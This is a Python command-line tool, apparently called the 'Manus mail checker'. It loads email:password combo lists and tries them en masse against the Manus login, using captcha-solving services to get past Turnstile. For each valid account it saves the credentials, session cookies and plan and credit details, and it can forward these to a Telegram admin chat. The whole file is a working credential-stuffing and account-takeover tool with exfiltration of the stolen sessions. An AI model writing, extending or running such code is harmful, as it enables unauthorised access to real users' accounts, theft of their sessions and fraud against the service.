#!/usr/bin/env python3
"""Manus mail-mode CLI — email:pass login → plan pull → cookie capture.

One-shot:
  python scripts/manus_mail_check.py --email user@mail.com --password 'secret'
  python scripts/manus_mail_check.py --file combos.txt [--concurrency 5]
  python scripts/manus_mail_check.py --file "a.txt,b.txt,logs/*.txt"
  combos.txt format: email:password per line (same parser as bot)

Interactive (no action flags):
  python scripts/manus_mail_check.py
  → menu: single / paste / .txt file(s) / session-token / options / run / quit
  → loaded combos stay in session; hits append to .txt after every run

  Turnstile solving (Manus login is captcha-walled):
    free Fahim API runs by default (no key needed)
    export CAPSOLVER_KEY=...     (or TWOCAPTCHA_KEY=...) for fallback
    ... or pass --capsolver-key / --twocaptcha-key
"""
from __future__ import annotations

import argparse
import asyncio
import getpass
import glob
import os
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from hotmail.parser import parse_combo_line  # noqa: E402
from hotmail import manus_mail  # noqa: E402

_stage_lock = threading.Lock()


def stage_printer(msg: str) -> None:
    with _stage_lock:
        print(msg, flush=True)


def p(msg: str = "") -> None:
    print(msg, flush=True)


def clean_path(raw: str) -> str:
    """Strip drag-drop quotes/whitespace, expand ~, keep globs intact."""
    s = (raw or "").strip()
    if len(s) >= 2 and s[0] == s[-1] and s[0] in ("'", '"'):
        s = s[1:-1].strip()
    return os.path.expanduser(s)


def resolve_txt_files(spec: str):
    """Comma-separated paths and/or globs → existing .txt files (deduped)."""
    found: list[Path] = []
    seen = set()
    for part in (spec or "").split(","):
        part = clean_path(part)
        if not part:
            continue
        cands = [Path(x) for x in glob.glob(part)] if any(
            ch in part for ch in ("*", "?", "[")) else [Path(part)]
        if not cands:
            p(f"  ! not found: {part}")
            continue
        for c in cands:
            if not c.is_file():
                p(f"  ! not a file: {c}")
                continue
            key = str(c.resolve())
            if key not in seen:
                seen.add(key)
                found.append(c)
    return found


def load_combos_file(path: Path):
    """Parse a .txt into combos. Returns (combos, total_lines)."""
    combos = []
    try:
        lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()
    except Exception as e:
        p(f"  ! read failed {path}: {e}")
        return [], 0
    for i, line in enumerate(lines, 1):
        try:
            c = parse_combo_line(line, i)
        except Exception:
            c = None
        if c:
            combos.append(c)
    return combos, len(lines)


def dedupe_combos(combos):
    seen = set()
    out = []
    for c in combos:
        key = (str(getattr(c, "email", "")).lower(),
               str(getattr(c, "password", "")))
        if key not in seen:
            seen.add(key)
            out.append(c)
    return out


async def check_one(email, password, timeout, sem, solver: dict, on_hit=None,
                start_gate=None):
    async with sem:
        if start_gate is not None:
            async with start_gate[0]:
                now = asyncio.get_event_loop().time()
                wait = start_gate[1][0] + start_gate[2] - now
                if wait > 0:
                    await asyncio.sleep(wait)
                start_gate[1][0] = asyncio.get_event_loop().time()
        r = await asyncio.to_thread(
            manus_mail.check_combo, email, password,
            timeout=timeout,
            captcha_token=solver.get("captcha_token", ""),
            capsolver_key=solver.get("capsolver", ""),
            twocaptcha_key=solver.get("twocaptcha", ""),
            no_browser=solver.get("no_browser", False),
            solver=solver.get("solver_mode", ""),
            on_stage=stage_printer,
        )
        r["password"] = password
        if on_hit and str(r.get("status")) == "valid":
            try:
                await on_hit(r)
            except Exception:
                pass
        return r


async def run_combos(combos, *, timeout, concurrency, solver, out_path="",
                   solve_delay: float = 0.0):
    """Run checks; each valid hit is written LIVE to its own .txt file.

    Files land in <out-stem>_hits/ next to out_path (op.py style, one per
    account — never all-in-one). Returns (results, seconds, [(path, caption)]).
    solve_delay spaces out combo starts (eases free-solver per-IP throttling).
    """
    sem = asyncio.Semaphore(max(1, int(concurrency or 1)))
    t0 = time.time()
    lock = asyncio.Lock()
    hit_dir = ""
    if out_path:
        op = Path(out_path)
        hit_dir = str(op.parent / (op.stem + "_hits"))
    hit_files: list = []
    gate = (asyncio.Lock(), [0.0], max(0.0, float(solve_delay or 0.0)))

    async def on_hit(r):
        if not hit_dir:
            return
        from hotmail import manus_mail as _mm

        async with lock:
            try:
                wrote = await asyncio.to_thread(_mm.write_hit_files, [r], hit_dir)
            except Exception:
                wrote = []
            hit_files.extend(wrote)
        for pth, _cap in wrote:
            with _stage_lock:
                print(f"  💾 saved → {pth}", flush=True)

    results = await asyncio.gather(
        *[check_one(c.email, c.password, timeout, sem, solver, on_hit,
                    start_gate=gate) for c in combos]
    )
    return results, time.time() - t0, hit_files


async def forward_hit_files(hit_files, chat_id: int = 0) -> tuple:
    """Send each per-account .txt with its own caption. Returns (sent, failed)."""
    sent, failed = 0, []
    for pth, cap in hit_files or []:
        err = await forward_to_admin(pth, cap, chat_id=chat_id)
        if not err:
            sent += 1
            try:
                log = Path(pth).parent / ".sent.log"
                with open(log, "a", encoding="utf-8") as f:
                    f.write(Path(pth).name + "\n")
            except Exception:
                pass
        else:
            failed.append(Path(pth).name)
        await asyncio.sleep(0.6)
    return sent, failed


def unsent_files(hit_dir) -> list:
    """Files in hit_dir not yet recorded in .sent.log."""
    try:
        sent = set((Path(hit_dir) / ".sent.log").read_text(
            encoding="utf-8", errors="ignore").split())
    except Exception:
        sent = set()
    out = []
    for pth in sorted(Path(hit_dir).glob("*.txt")):
        if pth.name not in sent:
            out.append(pth)
    return out


async def forward_to_admin(file_path: str, caption: str, chat_id: int = 0) -> str:
    """Send a hit .txt to the Telegram admin chat via the bot token."""
    from config import ADMIN_FORWARD_CHAT_ID, BOT_TOKEN

    cid = int(chat_id or ADMIN_FORWARD_CHAT_ID or 0)
    if not BOT_TOKEN:
        return "no BOT_TOKEN (bot_token.txt / env missing)"
    if not cid:
        return "no admin chat id (ADMIN_ALLOWLIST empty)"
    if not file_path or not Path(file_path).is_file():
        return f"file missing: {file_path}"
    try:
        from telegram import Bot

        async with Bot(token=BOT_TOKEN) as bot:
            await bot.send_document(
                chat_id=cid, document=open(file_path, "rb"),
                filename=Path(file_path).name,
                caption=(caption or "🧠 Manus hits")[:1024],
                parse_mode="HTML")
        return ""
    except Exception as e:
        return str(e)[:160]


def hit_block(email, password, d, cookies):
    ns = "\n".join(cookies.get("netscape") or [])
    return (
        f"# Manus account: {email}\n"
        f"# Plan: {d.get('plan', '?')} | credits={d.get('totalCredits', '?')} "
        f"| tasks={d.get('tasks', '?')} | phoneGate={d.get('phoneGate')}\n"
        f"{email}:{password}\nCookie: {cookies.get('header') or ''}\n{ns}"
    )


def summarize(results, combos, dt, out_path):
    counts: dict = {}
    valid_blocks = []
    for r in results:
        st = str(r.get("status") or "error")
        counts[st] = counts.get(st, 0) + 1
        d = r.get("details") or {}
        plan = d.get("plan") or "?"
        cookies = d.get("cookies") or {}
        has_cookie = bool(cookies.get("session_id"))
        p(f"[{st.upper():10}] {r.get('email')} :: {str(r.get('message') or '')[:110]}"
          f" | plan={plan} cookie={'yes' if has_cookie else 'no'}")
        if st == "valid":
            email = str(r.get("email") or "")
            password = next((c.password for c in combos if c.email == email), "")
            valid_blocks.append(hit_block(email, password, d, cookies))
    p(f"\n--- {len(results)} combos in {dt:.1f}s ---")
    for k, v in sorted(counts.items()):
        p(f"  {k}: {v}")
    # hits were already appended LIVE to out_path during the run
    return counts, valid_blocks


async def amain(args) -> int:
    # Captcha-free path: validate a grabbed session key directly.
    if args.session_token:
        r = manus_mail.check_session_token(
            args.session_token, email=args.email or "", timeout=args.timeout)
        d = r.get("details") or {}
        p(f"[{str(r.get('status') or '').upper():10}] {r.get('email')} :: "
          f"{str(r.get('message') or '')[:120]}")
        p(f"  user={d.get('name')} plan={d.get('plan')} "
          f"total={d.get('totalCredits')} periodic={d.get('periodicCredits')} "
          f"tasks={d.get('tasks')} phoneGate={d.get('phoneGate')}")
        ck = (d.get("cookies") or {}).get("header") or ""
        p(f"  cookie: {ck[:80]}...")
        if r.get("status") == "valid" and args.out:
            files = manus_mail.write_hit_files(
                [{"email": str(r.get("email") or ""),
                  "password": "",
                  "details": d}],
                str(Path(args.out).parent / (Path(args.out).stem + "_hits")))
            for pth, _cap in files:
                p(f"  💾 saved → {pth}")
            if args.forward and files:
                sent, failed = await forward_hit_files(files, chat_id=args.admin_id)
                p(f"  ✈️ forwarded {sent}/{len(files)} to admin"
                  + (f" (failed: {', '.join(failed)})" if failed else ""))
        elif args.forward:
            p("  ! nothing valid to forward")
        return 0 if r.get("status") == "valid" else 1

    combos = []
    if args.file:
        files = resolve_txt_files(args.file)
        if not files:
            p("FAIL: no .txt files matched")
            return 2
        for f in files:
            got, total = load_combos_file(f)
            combos.extend(got)
            p(f"  + {f.name}: {len(got)} combos / {total} lines")
        combos = dedupe_combos(combos)
        if not combos:
            p("FAIL: no email:pass combos parsed from .txt file(s)")
            return 2
    else:
        if not args.email or not args.password:
            p("FAIL: need --email + --password or --file")
            return 2
        from hotmail.parser import HotmailCombo

        combos = [HotmailCombo(email=args.email.strip(), password=args.password, line_no=1)]

    solver = {
        "capsolver": args.capsolver_key or os.environ.get("CAPSOLVER_KEY", ""),
        "twocaptcha": args.twocaptcha_key or os.environ.get("TWOCAPTCHA_KEY", ""),
        "no_browser": args.no_browser,
        "captcha_token": args.captcha_token,
        "solver_mode": args.solver,
    }
    results, dt, hit_files = await run_combos(
        combos, timeout=args.timeout, concurrency=args.concurrency, solver=solver,
        out_path=args.out, solve_delay=args.solve_delay)
    counts, _ = summarize(results, combos, dt, args.out)
    n_valid = int(counts.get("valid") or 0)
    if hit_files:
        p(f"hits → {Path(hit_files[0][0]).parent}/ ({len(hit_files)} files)")
    if args.forward:
        if hit_files:
            if not args.resend:
                try:
                    done = set((Path(args.out).parent / (Path(args.out).stem + "_hits" ) / ".sent.log").read_text(
                        encoding="utf-8", errors="ignore").split())
                except Exception:
                    done = set()
                hit_files = [f for f in hit_files if Path(f[0]).name not in done]
            if not hit_files:
                p("  = already forwarded (use --resend to repeat)")
            else:
                sent, failed = await forward_hit_files(hit_files, chat_id=args.admin_id)
                p(f"  ✈️ forwarded {sent} to admin"
                  + (f" (failed: {', '.join(failed)})" if failed else ""))
        else:
            p("  ! nothing valid to forward")
    if args.file:
        return 0
    return 0 if counts.get("valid") else 1


# ── interactive ────────────────────────────────────────────────

BANNER = "♛ MANUS MAIL CHECKER — interactive"


def ask(prompt: str, default: str = "") -> str:
    tag = f" [{default}]" if default else ""
    try:
        s = input(f"{prompt}{tag}: ").strip()
    except (EOFError, KeyboardInterrupt):
        raise StopIteration
    return s if s else default


def ask_secret(prompt: str) -> str:
    try:
        try:
            return getpass.getpass(f"{prompt}: ")
        except Exception:
            return input(f"{prompt}: ").strip()
    except (EOFError, KeyboardInterrupt):
        raise StopIteration


def show_menu(n_loaded: int, opts: dict) -> None:
    p(f"\n{BANNER}")
    p(f"  loaded combos: {n_loaded}   out: {opts['out']}   "
      f"threads: {opts['concurrency']}   timeout: {opts['timeout']}s")
    p("  [1] check single combo (email:pass)")
    p("  [2] paste combos (blank line to finish, /save to keep as .txt)")
    p("  [3] load .txt file(s) — comma list, globs ok, drag & drop ok")
    p("  [4] check session token (captcha-free)")
    p("  [5] options (threads / timeout / out file)")
    p("  [6] run loaded combos")
    p("  [7] save loaded combos to .txt")
    p("  [8] clear loaded combos")
    p("  [9] forward hits .txt to Telegram admin")
    p("  [0] quit")


def do_run(combos, opts, solver_extra=None) -> int:
    solver = {
        "capsolver": opts.get("capsolver") or os.environ.get("CAPSOLVER_KEY", ""),
        "twocaptcha": opts.get("twocaptcha") or os.environ.get("TWOCAPTCHA_KEY", ""),
        "no_browser": opts.get("no_browser", False),
        "captcha_token": opts.get("captcha_token", ""),
        "solver_mode": opts.get("solver_mode", ""),
    }
    if solver_extra:
        solver.update(solver_extra)
    p(f"▶ checking {len(combos)} combo(s) ... one .txt per hit → {opts['out']}")
    results, dt, hit_files = asyncio.run(run_combos(
        combos, timeout=opts["timeout"], concurrency=opts["concurrency"],
        solver=solver, out_path=opts["out"],
        solve_delay=opts.get("solve_delay", 0.0)))
    counts, _ = summarize(results, combos, dt, opts["out"])
    opts["last_counts"] = counts
    opts["last_total"] = len(results)
    opts["last_hit_files"] = hit_files
    return 0 if any(str(r.get("status")) == "valid" for r in results) else 1


def interactive() -> int:
    from hotmail.parser import HotmailCombo

    combos: list = []
    opts = {"concurrency": 5, "timeout": 40.0, "out": "MANUS_CLI_VALID.txt",
            "capsolver": "", "twocaptcha": "", "no_browser": False,
            "captcha_token": "", "solve_delay": 0.0}
    p(BANNER)
    p("Manus email:pass → Turnstile → plan + cookies. Ctrl+C quits anytime.")
    try:
        while True:
            show_menu(len(combos), opts)
            choice = ask("choice", "6" if combos else "1")
            if choice == "0":
                p("bye.")
                return 0
            elif choice == "1":
                email = ask("email")
                if not email:
                    continue
                password = ask_secret("password")
                if "@" not in email or not password:
                    p("  ! need email + password")
                    continue
                do_run([HotmailCombo(email=email.strip(), password=password, line_no=1)], opts)
            elif choice == "2":
                p("paste email:pass lines (blank line = done, /save <file> = keep as .txt):")
                pasted = []
                save_to = ""
                while True:
                    try:
                        line = input()
                    except (EOFError, KeyboardInterrupt):
                        raise StopIteration
                    s = line.strip()
                    if not s:
                        break
                    if s.startswith("/save"):
                        save_to = clean_path(s[5:]) or f"pasted_{datetime.now():%Y%m%d_%H%M%S}.txt"
                        continue
                    pasted.append(s)
                got = []
                for i, ln in enumerate(pasted, 1):
                    try:
                        c = parse_combo_line(ln, i)
                    except Exception:
                        c = None
                    if c:
                        got.append(c)
                p(f"  parsed {len(got)}/{len(pasted)}")
                if save_to and pasted:
                    Path(save_to).write_text("\n".join(pasted) + "\n", encoding="utf-8")
                    p(f"  saved paste → {save_to}")
                if got:
                    combos = dedupe_combos(combos + got)
                    p(f"  loaded total: {len(combos)}")
                    if ask("run now? (y/n)", "y").lower().startswith("y"):
                        do_run(list(combos), opts)
            elif choice == "3":
                spec = ask(".txt path(s) — comma/glob/drag-drop")
                if not spec:
                    continue
                files = resolve_txt_files(spec)
                if not files:
                    continue
                for f in files:
                    got, total = load_combos_file(f)
                    combos.extend(got)
                    p(f"  + {f.name}: {len(got)} combos / {total} lines")
                combos = dedupe_combos(combos)
                p(f"  loaded total: {len(combos)}")
            elif choice == "4":
                tok = ask_secret("session token (JWT/session_id)")
                if len(tok) < 20:
                    p("  ! token too short")
                    continue
                email = ask("email label (optional)")
                r = manus_mail.check_session_token(
                    tok, email=email, timeout=opts["timeout"])
                d = r.get("details") or {}
                p(f"[{str(r.get('status') or '').upper():10}] {r.get('email')} :: "
                  f"{str(r.get('message') or '')[:120]}")
                p(f"  user={d.get('name')} plan={d.get('plan')} "
                  f"total={d.get('totalCredits')} tasks={d.get('tasks')} "
                  f"phoneGate={d.get('phoneGate')}")
                if r.get("status") == "valid":
                    ck = (d.get("cookies") or {}).get("header") or ""
                    ns = "\n".join((d.get("cookies") or {}).get("netscape") or [])
                    Path(opts["out"]).write_text(
                        f"# Manus account: {r.get('email')}\n# Plan: {d.get('plan')} | "
                        f"credits={d.get('totalCredits')}\nCookie: {ck}\n{ns}\n",
                        encoding="utf-8")
                    p(f"WROTE {opts['out']}")
            elif choice == "5":
                c = ask("threads", str(opts["concurrency"]))
                try:
                    opts["concurrency"] = max(1, int(c))
                except ValueError:
                    pass
                t = ask("timeout seconds", str(opts["timeout"]))
                try:
                    opts["timeout"] = max(5.0, float(t))
                except ValueError:
                    pass
                o = ask("out .txt file", opts["out"])
                opts["out"] = clean_path(o) or opts["out"]
                sd = ask("solve delay sec (0=off, eases solver throttling)",
                         str(opts.get("solve_delay", 0.0)))
                try:
                    opts["solve_delay"] = max(0.0, float(sd))
                except ValueError:
                    pass
                p(f"  ok: threads={opts['concurrency']} timeout={opts['timeout']} out={opts['out']} delay={opts.get('solve_delay', 0.0)}")
            elif choice == "6":
                if not combos:
                    p("  ! nothing loaded — use 1/2/3 first")
                    continue
                do_run(list(combos), opts)
            elif choice == "7":
                if not combos:
                    p("  ! nothing loaded")
                    continue
                dest = ask("save to .txt", f"combos_{datetime.now():%Y%m%d_%H%M%S}.txt")
                dest = clean_path(dest)
                if not dest.lower().endswith(".txt"):
                    dest += ".txt"
                Path(dest).write_text(
                    "\n".join(f"{c.email}:{c.password}" for c in combos) + "\n",
                    encoding="utf-8")
                p(f"  saved {len(combos)} combos → {dest}")
            elif choice == "8":
                combos = []
                p("  cleared")
            elif choice == "9":
                from hotmail import manus_mail as _mmf

                hdir = str(Path(opts["out"]).parent / (Path(opts["out"]).stem + "_hits"))
                pending = unsent_files(hdir) if Path(hdir).is_dir() else []
                if not pending and not (opts.get("last_hit_files") or []):
                    p("  ! no hits yet — run first (each valid gets its own .txt)")
                    continue
                files = opts.get("last_hit_files") or []
                if not files:
                    # Rebuild (path, caption) pairs from unsent files on disk.
                    files = []
                    for pth in pending:
                        email = pth.stem.replace("_", "@", 1) if "@" not in pth.stem else pth.stem
                        plan, credits = "Free", "?"
                        try:
                            for ln in pth.read_text(encoding="utf-8", errors="ignore").splitlines():
                                if ln.startswith("Plan:"):
                                    plan = ln.split("|")[0].replace("Plan:", "").strip()
                                    for part in ln.split("|"):
                                        if "credits" in part:
                                            credits = part.split(":")[-1].strip()
                        except Exception:
                            pass
                        files.append((str(pth), _mmf.hit_caption(
                            email, {"plan": plan, "totalCredits": credits})))
                else:
                    done = set()
                    try:
                        done = set((Path(hdir) / ".sent.log").read_text(
                            encoding="utf-8", errors="ignore").split())
                    except Exception:
                        pass
                    files = [f for f in files if Path(f[0]).name not in done]
                    if not files:
                        p("  = already forwarded (use --resend in one-shot to repeat)")
                        continue
                p(f"  ✈️ sending {len(files)} file(s) to admin ...")
                sent, failed = asyncio.run(forward_hit_files(files))
                p(f"  ✈️ forwarded {sent}/{len(files)} to admin"
                  + (f" (failed: {', '.join(failed)})" if failed else ""))
            else:
                p("  ? pick 0-9")
    except StopIteration:
        p("\nbye.")
        return 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--email", default="")
    ap.add_argument("--password", default="")
    ap.add_argument("--file", default="",
                    help=".txt file(s): comma-separated list and/or globs")
    ap.add_argument("--concurrency", type=int, default=5)
    ap.add_argument("--timeout", type=float, default=40.0)
    ap.add_argument("--out", default="MANUS_CLI_VALID.txt")
    ap.add_argument("--capsolver-key", default="")
    ap.add_argument("--twocaptcha-key", default="")
    ap.add_argument("--no-browser", action="store_true",
                    help="skip in-house Chromium Turnstile harvest")
    ap.add_argument("--captcha-token", default="",
                    help="fresh cf-turnstile-response token (paste from your browser, ~5 min life)")
    ap.add_argument("--session-token", default="",
                    help="fresh LoginByEmail JWT / session_id (captcha-free verify: plan+cookies)")
    ap.add_argument("--solve-delay", type=float, default=0.0,
                    help="seconds between combo starts (eases free-solver throttling)")
    ap.add_argument("--solver", default="",
                    help="''=Fahim-only (fast), 'ours'/'auto'=our solver first, 'all'=everything")
    ap.add_argument("--forward", action="store_true",
                    help="send the hits .txt to the Telegram admin chat after the run")
    ap.add_argument("--resend", action="store_true",
                    help="forward even files already recorded in .sent.log")
    ap.add_argument("--admin-id", type=int, default=0,
                    help="override admin chat id (default: ADMIN_FORWARD_CHAT_ID)")
    args = ap.parse_args()
    if not args.email and not args.password and not args.file and not args.session_token:
        return interactive()
    return asyncio.run(amain(args))


if __name__ == "__main__":
    raise SystemExit(main())
